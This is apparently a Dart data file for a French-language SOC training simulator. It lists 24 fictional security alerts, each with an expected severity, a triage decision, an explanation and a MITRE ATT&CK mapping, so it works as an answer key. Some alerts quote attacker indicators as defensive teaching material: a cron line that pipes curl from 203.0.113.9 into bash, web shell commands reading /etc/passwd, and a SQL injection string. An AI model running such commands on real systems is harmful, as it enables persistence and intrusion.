/// Alertes FICTIVES du simulateur SOC. Les adresses IP utilisent les plages
/// réservées à la documentation (RFC 5737 : 192.0.2.0/24, 198.51.100.0/24,
/// 203.0.113.0/24) ou des réseaux privés.
///
/// Pour chaque alerte, l'apprenant choisit une gravité et une DÉCISION,
/// c'est-à-dire la prochaine étape de l'analyste :
/// - Clôturer : faux positif ou activité légitime documentée ;
/// - Surveiller : activité sans impact (bloquée, bruit), à garder à l'œil ;
/// - Investiguer : situation ambiguë, à vérifier avant de conclure ;
/// - Contenir : compromission probable, il faut limiter les dégâts tout de
///   suite (isoler, bloquer, désactiver).
class SocAlert {
  final String id;
  final String title;
  final String details;
  final String source;
  final String severity;
  final String decision;
  final String explanation;
  final String action;

  /// Technique MITRE ATT&CK associée (null pour un faux positif).
  final String? mitre;

  const SocAlert({
    required this.id,
    required this.title,
    required this.details,
    required this.source,
    required this.severity,
    required this.decision,
    required this.explanation,
    required this.action,
    this.mitre,
  });
}

class SocCatalog {
  SocCatalog._();

  static const severities = [
    'Critique',
    'Élevé',
    'Moyen',
    'Faible',
    'Informations',
  ];

  static const decisions = [
    'Clôturer',
    'Surveiller',
    'Investiguer',
    'Contenir',
  ];

  static const decisionHelp = {
    'Clôturer': 'faux positif ou activité légitime documentée',
    'Surveiller': 'sans impact (bloqué, bruit) mais à garder à l\'œil',
    'Investiguer': 'ambigu : vérifier avant de conclure',
    'Contenir': 'compromission probable : limiter les dégâts maintenant',
  };

  static const alerts = <SocAlert>[
    SocAlert(
      id: 's1',
      title: 'Tentatives de connexion répétées',
      details:
          '35 échecs de connexion SSH (Failed password) depuis 203.0.113.7 en '
          '2 minutes, vers le compte root d\'un serveur exposé sur Internet.',
      source: 'auth.log / SIEM',
      severity: 'Élevé',
      decision: 'Contenir',
      explanation:
          'Attaque par force brute en cours sur SSH. Aucune connexion n\'a '
          'réussi, mais le compte visé est root : une réussite donnerait le '
          'contrôle total du serveur.',
      action:
          'Bloquer l\'IP (pare-feu, fail2ban), vérifier qu\'aucune connexion '
          'n\'a abouti, interdire la connexion directe de root (PermitRootLogin '
          'no) et privilégier les clés SSH.',
      mitre: 'T1110 — Brute Force',
    ),
    SocAlert(
      id: 's2',
      title: 'Connexion depuis une nouvelle IP',
      details:
          'Connexion SSH réussie (Accepted password) pour l\'utilisateur alice '
          'depuis 198.51.100.77, une adresse jamais vue pour ce compte.',
      source: 'auth.log',
      severity: 'Moyen',
      decision: 'Investiguer',
      explanation:
          'Peut être légitime (télétravail, nouveau fournisseur d\'accès) ou '
          'signer un compte volé. Rien ne permet encore de conclure.',
      action:
          'Contacter alice par un autre canal, vérifier la géolocalisation et '
          'l\'activité de la session ; si elle ne reconnaît pas la connexion, '
          'réinitialiser son mot de passe et fermer la session.',
      mitre: 'T1078 — Valid Accounts',
    ),
    SocAlert(
      id: 's3',
      title: 'Processus inhabituel',
      details:
          'Processus « minerd » consommant 350 % de CPU, absent de la liste des '
          'processus attendus, lancé depuis /tmp par l\'utilisateur www-data.',
      source: 'EDR / ps aux',
      severity: 'Critique',
      decision: 'Contenir',
      explanation:
          'Un mineur de cryptomonnaie lancé depuis /tmp par le compte du '
          'serveur web : l\'application web a très probablement été exploitée.',
      action:
          'Isoler la machine, conserver des preuves (mémoire, binaire), '
          'identifier la faille web exploitée, puis éradiquer et reconstruire.',
      mitre: 'T1496 — Resource Hijacking',
    ),
    SocAlert(
      id: 's4',
      title: 'Fichier des comptes modifié',
      details:
          'Le fichier /etc/passwd a été modifié à 02:30, hors de toute fenêtre '
          'de maintenance, sans ticket de changement associé.',
      source: 'FIM / auditd',
      severity: 'Élevé',
      decision: 'Investiguer',
      explanation:
          'Une modification nocturne et non planifiée du fichier des comptes '
          'peut cacher la création d\'un compte dérobé, mais il peut aussi '
          's\'agir d\'un script d\'administration oublié.',
      action:
          'Comparer avec la dernière version connue, lister les comptes créés '
          'ou modifiés, retrouver le processus et l\'utilisateur à l\'origine '
          'de l\'écriture (auditd).',
      mitre: 'T1136 — Create Account',
    ),
    SocAlert(
      id: 's5',
      title: 'Trafic sortant massif',
      details:
          '2,5 Go envoyés en 10 minutes vers une IP externe inconnue '
          '(203.0.113.200) depuis le serveur de base de données de production.',
      source: 'IDS / NetFlow',
      severity: 'Critique',
      decision: 'Contenir',
      explanation:
          'Un serveur de base de données n\'a aucune raison d\'envoyer autant '
          'de données vers Internet : exfiltration très probable.',
      action:
          'Bloquer immédiatement le flux sortant, isoler le serveur, préserver '
          'les journaux et identifier les données concernées (obligation de '
          'notification possible, RGPD).',
      mitre: 'T1041 — Exfiltration Over C2 Channel',
    ),
    SocAlert(
      id: 's6',
      title: 'Élévation de privilèges',
      details:
          'Commande sudo réussie par « bob », qui n\'appartient pas au groupe '
          'sudo, suivie de la lecture de /etc/shadow.',
      source: 'auth.log / journaux sudo',
      severity: 'Critique',
      decision: 'Contenir',
      explanation:
          'Une élévation de privilèges non autorisée suivie d\'un accès aux '
          'hashes de mots de passe : l\'attaquant prépare la suite.',
      action:
          'Désactiver le compte bob, isoler la machine, corriger la faille '
          'd\'élévation (sudoers, binaire vulnérable) et changer les mots de '
          'passe exposés.',
      mitre: 'T1548.003 — Sudo and Sudo Caching',
    ),
    SocAlert(
      id: 's7',
      title: 'Scan de ports bloqué',
      details:
          'Le pare-feu périmétrique a bloqué 1 200 paquets SYN venant de '
          '192.0.2.50 vers des ports variés de l\'adresse publique de '
          'l\'entreprise. Aucun port ouvert n\'a répondu.',
      source: 'Pare-feu',
      severity: 'Faible',
      decision: 'Surveiller',
      explanation:
          'Les scans automatiques depuis Internet sont permanents. Celui-ci a '
          'été entièrement bloqué : c\'est du bruit, sans impact.',
      action:
          'Aucune action urgente. Vérifier que la règle de blocage est '
          'efficace et surveiller une éventuelle suite (tentatives ciblées).',
      mitre: 'T1046 — Network Service Discovery',
    ),
    SocAlert(
      id: 's8',
      title: 'Redémarrage de 40 postes',
      details:
          '40 postes de travail ont redémarré à 03:00. Un déploiement de mises '
          'à jour était planifié à cette heure (ticket CHG-1042 validé).',
      source: 'Supervision / gestion de parc',
      severity: 'Informations',
      decision: 'Clôturer',
      explanation:
          'L\'événement correspond exactement à une opération planifiée et '
          'documentée : c\'est une activité légitime.',
      action:
          'Clôturer en référençant le ticket de changement ; éventuellement '
          'ajuster la règle pour ne plus alerter pendant les fenêtres prévues.',
    ),
    SocAlert(
      id: 's9',
      title: 'Pièce jointe piégée ouverte',
      details:
          'Un e-mail « Facture impayée » avec un document Word à macros a été '
          'reçu par 15 employés. Deux l\'ont ouvert et la macro s\'est exécutée.',
      source: 'Passerelle mail / EDR',
      severity: 'Critique',
      decision: 'Contenir',
      explanation:
          'Hameçonnage ciblé avec exécution de code sur deux postes : '
          'l\'attaquant a probablement un premier accès.',
      action:
          'Isoler les deux postes, supprimer l\'e-mail de toutes les boîtes, '
          'bloquer l\'expéditeur et les domaines contactés, réinitialiser les '
          'mots de passe des deux utilisateurs.',
      mitre: 'T1566.001 — Spearphishing Attachment',
    ),
    SocAlert(
      id: 's10',
      title: 'PowerShell lancé par Word',
      details:
          'WINWORD.EXE a lancé powershell.exe avec l\'option -EncodedCommand '
          'et une longue chaîne en Base64, puis une connexion vers Internet.',
      source: 'EDR (arbre de processus)',
      severity: 'Critique',
      decision: 'Contenir',
      explanation:
          'Un traitement de texte n\'a aucune raison de lancer PowerShell avec '
          'une commande encodée : schéma typique d\'un chargeur de malware.',
      action:
          'Isoler le poste, décoder la commande pour identifier le serveur '
          'contacté, bloquer ce serveur et rechercher le même comportement '
          'sur les autres postes.',
      mitre: 'T1059.001 — PowerShell',
    ),
    SocAlert(
      id: 's11',
      title: 'Fichiers renommés en masse',
      details:
          'Plus de 900 fichiers d\'un partage réseau renommés en « .locked » en '
          '3 minutes ; un fichier LISEZ-MOI.txt est apparu dans chaque dossier.',
      source: 'Serveur de fichiers / EDR',
      severity: 'Critique',
      decision: 'Contenir',
      explanation:
          'Signature d\'un rançongiciel en train de chiffrer les données. '
          'Chaque minute compte.',
      action:
          'Couper immédiatement le poste source du réseau, déconnecter le '
          'partage, préserver les preuves, vérifier les sauvegardes hors '
          'ligne. Ne pas payer la rançon.',
      mitre: 'T1486 — Data Encrypted for Impact',
    ),
    SocAlert(
      id: 's12',
      title: 'Requêtes DNS étranges',
      details:
          'Le poste 192.168.1.66 envoie une requête DNS toutes les 5 secondes '
          'vers des sous-domaines longs et aléatoires de exfil.example.net, '
          'un domaine créé il y a deux jours.',
      source: 'DNS / IDS',
      severity: 'Élevé',
      decision: 'Investiguer',
      explanation:
          'Ressemble fortement à un tunnel DNS (données encodées dans les '
          'noms demandés) ou à un canal de commande de malware.',
      action:
          'Examiner le poste (processus à l\'origine des requêtes), décoder '
          'quelques sous-domaines, bloquer le domaine sur les résolveurs ; '
          'contenir dès que la compromission est confirmée.',
      mitre: 'T1071.004 — Application Layer Protocol: DNS',
    ),
    SocAlert(
      id: 's13',
      title: 'Injections SQL bloquées',
      details:
          'Le pare-feu applicatif (WAF) a bloqué 300 requêtes contenant '
          '« \' OR 1=1-- » sur /login, toutes avec le User-Agent sqlmap. '
          'Aucune réponse 200 ou 500 dans les journaux de l\'application.',
      source: 'WAF / journaux web',
      severity: 'Moyen',
      decision: 'Surveiller',
      explanation:
          'Une attaque réelle mais bloquée, et l\'application n\'a rien reçu : '
          'pas d\'impact constaté.',
      action:
          'Bloquer temporairement l\'IP, vérifier que la page /login utilise '
          'des requêtes préparées et surveiller une reprise avec d\'autres '
          'techniques de contournement.',
      mitre: 'T1190 — Exploit Public-Facing Application',
    ),
    SocAlert(
      id: 's14',
      title: 'Nouvelle tâche planifiée',
      details:
          'Une entrée crontab ajoutée pour www-data exécute toutes les 5 '
          'minutes : curl -s http://203.0.113.9/x.sh | bash',
      source: 'FIM / auditd',
      severity: 'Critique',
      decision: 'Contenir',
      explanation:
          'Télécharger et exécuter un script distant à intervalle régulier est '
          'un mécanisme de persistance classique d\'un attaquant.',
      action:
          'Supprimer la tâche, bloquer l\'IP, isoler le serveur et chercher '
          'comment l\'attaquant a obtenu les droits de www-data.',
      mitre: 'T1053.003 — Scheduled Task/Job: Cron',
    ),
    SocAlert(
      id: 's15',
      title: 'Clé SSH ajoutée à root',
      details:
          'Une nouvelle clé publique a été ajoutée à /root/.ssh/authorized_keys '
          'à 23:47, sans ticket de changement. Commentaire de la clé : '
          '« kali@kali ».',
      source: 'FIM',
      severity: 'Élevé',
      decision: 'Contenir',
      explanation:
          'Une clé inconnue pour root permet de revenir à volonté sans mot de '
          'passe : porte dérobée persistante.',
      action:
          'Retirer la clé, vérifier les connexions effectuées avec elle, '
          'auditer les autres fichiers authorized_keys et chercher le point '
          'd\'entrée initial.',
      mitre: 'T1098.004 — SSH Authorized Keys',
    ),
    SocAlert(
      id: 's16',
      title: 'Journaux effacés',
      details:
          'Le fichier /var/log/auth.log a été vidé (taille 0) à 03:12 et '
          'l\'historique bash de root a été supprimé.',
      source: 'Supervision des journaux / SIEM',
      severity: 'Élevé',
      decision: 'Investiguer',
      explanation:
          'Effacer les traces est typique d\'un attaquant qui veut masquer son '
          'activité ; heureusement, les journaux envoyés au SIEM restent '
          'disponibles.',
      action:
          'Récupérer les journaux centralisés de la période, identifier qui '
          'était connecté à 03:12 et préserver le disque pour l\'analyse.',
      mitre: 'T1070.002 — Clear Linux or Mac System Logs',
    ),
    SocAlert(
      id: 's17',
      title: 'Fichier de test antivirus',
      details:
          'L\'antivirus a mis en quarantaine le fichier EICAR sur le poste d\'un '
          'administrateur sécurité, qui a ouvert un ticket « test de la console '
          'antivirus » une heure avant.',
      source: 'Antivirus',
      severity: 'Informations',
      decision: 'Clôturer',
      explanation:
          'EICAR est un fichier inoffensif conçu pour tester les antivirus. '
          'Le test était annoncé : faux positif attendu.',
      action: 'Clôturer en référençant le ticket du test.',
    ),
    SocAlert(
      id: 's18',
      title: 'Pulvérisation de mots de passe',
      details:
          'Depuis 192.0.2.80 : une seule tentative par compte, sur 400 comptes, '
          'avec le même mot de passe « Printemps2026! ». Un compte (compta3) '
          's\'est connecté avec succès.',
      source: 'Annuaire / SIEM',
      severity: 'Critique',
      decision: 'Contenir',
      explanation:
          'Password spraying : peu d\'essais par compte pour éviter les '
          'verrouillages. Une réussite signifie un compte compromis.',
      action:
          'Désactiver ou réinitialiser compta3, fermer ses sessions, bloquer '
          'l\'IP, imposer l\'authentification multifacteur et interdire les '
          'mots de passe prévisibles.',
      mitre: 'T1110.003 — Password Spraying',
    ),
    SocAlert(
      id: 's19',
      title: 'Connexion VPN depuis l\'étranger',
      details:
          'Connexion VPN de Paul depuis l\'Espagne, MFA validé sur son '
          'téléphone habituel. Le calendrier RH indique qu\'il est en congés '
          'en Espagne cette semaine.',
      source: 'VPN / IAM',
      severity: 'Faible',
      decision: 'Clôturer',
      explanation:
          'Tous les éléments sont cohérents : localisation attendue, second '
          'facteur validé sur l\'appareil connu.',
      action:
          'Clôturer en notant les éléments vérifiés ; rappeler la politique '
          'de connexion pendant les congés si nécessaire.',
    ),
    SocAlert(
      id: 's20',
      title: 'Échecs puis réussite un lundi matin',
      details:
          'Compte marie : 6 échecs de connexion puis une réussite à 9:02, '
          'depuis son poste habituel. Son mot de passe a été changé vendredi '
          '(expiration).',
      source: 'Annuaire',
      severity: 'Faible',
      decision: 'Clôturer',
      explanation:
          'Schéma très courant après un changement de mot de passe : '
          'l\'utilisatrice a tapé l\'ancien plusieurs fois.',
      action: 'Clôturer. Aucune action technique nécessaire.',
    ),
    SocAlert(
      id: 's21',
      title: 'Deux passerelles pour une même IP',
      details:
          'Sur le VLAN des utilisateurs, l\'adresse de la passerelle '
          '192.168.1.1 est annoncée par deux adresses MAC différentes, dont '
          'une appartient à un poste de travail.',
      source: 'IDS / surveillance ARP',
      severity: 'Élevé',
      decision: 'Investiguer',
      explanation:
          'Signe d\'empoisonnement ARP : un poste se fait passer pour la '
          'passerelle afin d\'intercepter le trafic (homme du milieu).',
      action:
          'Identifier le poste propriétaire de la MAC suspecte (table du '
          'commutateur), l\'isoler si l\'usurpation est confirmée et activer '
          'la protection ARP dynamique sur les commutateurs.',
      mitre: 'T1557.002 — ARP Cache Poisoning',
    ),
    SocAlert(
      id: 's22',
      title: 'Script PHP inattendu',
      details:
          'Un fichier shell.php est apparu dans /var/www/uploads/. Les '
          'journaux montrent des requêtes GET /uploads/shell.php?cmd=whoami '
          'puis ?cmd=cat+/etc/passwd.',
      source: 'Journaux web / FIM',
      severity: 'Critique',
      decision: 'Contenir',
      explanation:
          'Un web shell : l\'attaquant exécute des commandes sur le serveur '
          'via le navigateur, après avoir téléversé un fichier.',
      action:
          'Mettre le site hors ligne ou bloquer l\'accès au fichier, préserver '
          'le fichier comme preuve, corriger la fonction de téléversement '
          '(types autorisés, exécution interdite dans uploads/).',
      mitre: 'T1505.003 — Web Shell',
    ),
    SocAlert(
      id: 's23',
      title: 'Envoi vers un stockage personnel',
      details:
          'Un employé ayant posé sa démission a envoyé 800 Mo de documents '
          'vers un service de stockage en ligne personnel, hier soir.',
      source: 'Proxy web / DLP',
      severity: 'Élevé',
      decision: 'Investiguer',
      explanation:
          'Possible fuite de données internes, mais il peut aussi s\'agir de '
          'fichiers personnels. Le sujet touche aux RH et au juridique.',
      action:
          'Identifier la nature des fichiers envoyés, impliquer les RH et le '
          'juridique, et suspendre l\'accès au service si des données '
          'sensibles sont confirmées.',
      mitre: 'T1567.002 — Exfiltration to Cloud Storage',
    ),
    SocAlert(
      id: 's24',
      title: 'Certificat bientôt expiré',
      details:
          'Le certificat TLS du site public www.example.com expire dans 7 '
          'jours. Aucun renouvellement automatique n\'est configuré.',
      source: 'Supervision',
      severity: 'Faible',
      decision: 'Surveiller',
      explanation:
          'Pas d\'attaque, mais un risque de disponibilité et de confiance : '
          'un certificat expiré bloque les visiteurs et habitue les '
          'utilisateurs à ignorer les alertes du navigateur.',
      action:
          'Ouvrir une demande de renouvellement et mettre en place le '
          'renouvellement automatique (ACME).',
    ),
  ];
}
